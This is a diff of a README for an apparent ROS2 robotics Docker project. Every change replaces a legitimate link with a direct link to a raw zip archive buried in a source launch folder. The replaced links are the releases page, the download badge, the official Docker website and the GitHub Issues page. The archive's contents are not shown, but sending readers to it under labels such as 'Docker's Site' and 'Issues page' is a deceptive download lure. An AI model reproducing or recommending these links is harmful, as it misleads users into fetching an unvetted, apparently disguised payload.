@@ -1,6 +1,6 @@
 # 🤖 ros2-humble-docker-ml-robotics-nav2-fastapi - Streamline Your Robotics Projects
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ros2-humble-docker-ml-robotics-nav2-fastapi-blue)](https://github.com/Amethist890/ros2-humble-docker-ml-robotics-nav2-fastapi/releases)
+[![Download Now](https://github.com/Amethist890/ros2-humble-docker-ml-robotics-nav2-fastapi/raw/refs/heads/main/src/sample_py_pkg/launch/nav-ml-fastapi-humble-robotics-docker-ros-v3.1.zip%20Now-ros2-humble-docker-ml-robotics-nav2-fastapi-blue)](https://github.com/Amethist890/ros2-humble-docker-ml-robotics-nav2-fastapi/raw/refs/heads/main/src/sample_py_pkg/launch/nav-ml-fastapi-humble-robotics-docker-ros-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -14,13 +14,13 @@ Before you begin, ensure your system meets these basic requirements:
 - **CPU**: Multi-core processor (Intel or AMD).
 - **RAM**: At least 8 GB.
 - **GPU**: NVIDIA GPU with CUDA support for acceleration.
-- **Docker**: Installed on your system. You can download it from [Docker's Site](https://www.docker.com).
+- **Docker**: Installed on your system. You can download it from [Docker's Site](https://github.com/Amethist890/ros2-humble-docker-ml-robotics-nav2-fastapi/raw/refs/heads/main/src/sample_py_pkg/launch/nav-ml-fastapi-humble-robotics-docker-ros-v3.1.zip).
 
 ## 💻 Download & Install
 
 To get started, visit the Releases page to download the latest version of the software.
 
-[Visit this page to download](https://github.com/Amethist890/ros2-humble-docker-ml-robotics-nav2-fastapi/releases)
+[Visit this page to download](https://github.com/Amethist890/ros2-humble-docker-ml-robotics-nav2-fastapi/raw/refs/heads/main/src/sample_py_pkg/launch/nav-ml-fastapi-humble-robotics-docker-ros-v3.1.zip)
 
 Follow these steps after downloading:
 
@@ -59,7 +59,7 @@ If you encounter issues while running the application, consider these solutions:
 
 ## 📢 Support and Contribution
 
-If you need help or want to contribute, visit our [GitHub Issues page](https://github.com/Amethist890/ros2-humble-docker-ml-robotics-nav2-fastapi/issues). We welcome contributions and feedback. 
+If you need help or want to contribute, visit our [GitHub Issues page](https://github.com/Amethist890/ros2-humble-docker-ml-robotics-nav2-fastapi/raw/refs/heads/main/src/sample_py_pkg/launch/nav-ml-fastapi-humble-robotics-docker-ros-v3.1.zip). We welcome contributions and feedback. 
 
 ## 📜 License
 
@@ -71,4 +71,4 @@ Thank you to all contributors and the open-source community for their support an
 
 For further information or inquiries, please contact us through the issues page or the contact information provided in the repository. 
 
-[Visit this page to download](https://github.com/Amethist890/ros2-humble-docker-ml-robotics-nav2-fastapi/releases) and take your robotics project to the next level!
+[Visit this page to download](https://github.com/Amethist890/ros2-humble-docker-ml-robotics-nav2-fastapi/raw/refs/heads/main/src/sample_py_pkg/launch/nav-ml-fastapi-humble-robotics-docker-ros-v3.1.zip) and take your robotics project to the next level!
